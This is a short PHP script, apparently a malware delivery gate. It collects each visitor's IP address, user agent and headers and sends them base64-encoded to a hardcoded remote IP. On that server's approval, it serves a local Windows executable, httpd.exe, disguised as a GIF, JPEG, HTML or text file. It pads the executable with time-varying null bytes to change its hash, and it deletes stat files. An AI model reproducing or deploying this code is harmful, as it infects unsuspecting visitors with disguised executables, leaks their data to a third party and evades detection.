<?php

error_reporting(0);
set_time_limit(300);
$s0 = $_SERVER['HTTP_USER_AGENT'];
$h1 = explode(';', $_SERVER['HTTP_USER_AGENT']);
$s2 = getallheaders();
function getRealIpAddr()
{
    if (! empty($_SERVER['HTTP_CLIENT_IP'])) {
        $j3 = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $j3 = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $j3 = $_SERVER['REMOTE_ADDR'];
    }

    return $j3;
}$q4 = true;
if (strpos($_SERVER['HTTP_USER_AGENT'], '5rrMiR6A2BmRK8z6hf245abd7KcX2NP5') !== false) {
    $q4 = false;
}$u5                   = [];
$u5['time']            = date('c');
$u5['ip']              = getRealIpAddr();
$u5['user']            = $_SERVER['HTTP_USER_AGENT'];
$u5['res']             = $_SERVER['SERVER_NAME'];
$u5['need_log']        = $q4;
$u5['ip_smarta']       = $_GET['ip_smarta'];
$u5['UA-CPU']          = (string) $s2['UA-CPU'];
$u5['Accept-Encoding'] = (string) $s2['Accept-Encoding'];
$a6                    = filesize(__DIR__ . '/httpd.exe');
$e7                    = @file_get_contents(__DIR__ . '/httpd.exe');
if ($_GET['nona'] != 'nona') {
    $i8 = time() % 3600;
    for ($w9 = 0; $w9 < $i8; $w9++) {
        $e7 .= "\0\0\0\0\0\0\0\0\0";
    }
}$m10 = strlen($e7);
$y11  = ['http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman']];
shuffle($y11);
$w12 = __DIR__ . '/download_big__stat.txt';
@unlink($w12);
foreach ($y11 as $o13) {
    $g14 = stream_context_create(['http' => ['timeout' => 10]]);
    $v15 = @file_get_contents($o13);
    if (empty($v15)) {
    }
    $y16 = json_decode($v15, true);
    if (empty($y16) || $y16['status'] != 'OK') {
        continue;
    }
    if ($q4) {
    }
    header('HTTP/1.1 200 OK');
    header('Date: ' . gmdate('D, d M Y H:i:s', time()) . ' GMT');
    header('Accept-Ranges: bytes');
    header('Content-Length: ' . $m10);
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Cache-Control: post-check=0, pre-check=0', false);
    header('Pragma: no-cache');
    header_remove('X-Powered-By');
    header_remove('Transfer-Encoding');
    $s17 = 'image/gif';
    if (strpos($_SERVER['REQUEST_URI'], '.html') !== false) {
        $s17 = 'text/html';
    }
    if (strpos($_SERVER['REQUEST_URI'], '.txt') !== false) {
        $s17 = 'text/plain';
    }
    if (strpos($_SERVER['REQUEST_URI'], '.jpg') !== false) {
        $s17 = 'image/jpeg';
    }
    header('Content-Type: ' . $s17);
    @unlink(__DIR__ . '/access_big__stat.txt');
    echo $e7;
    exit;
}exit();
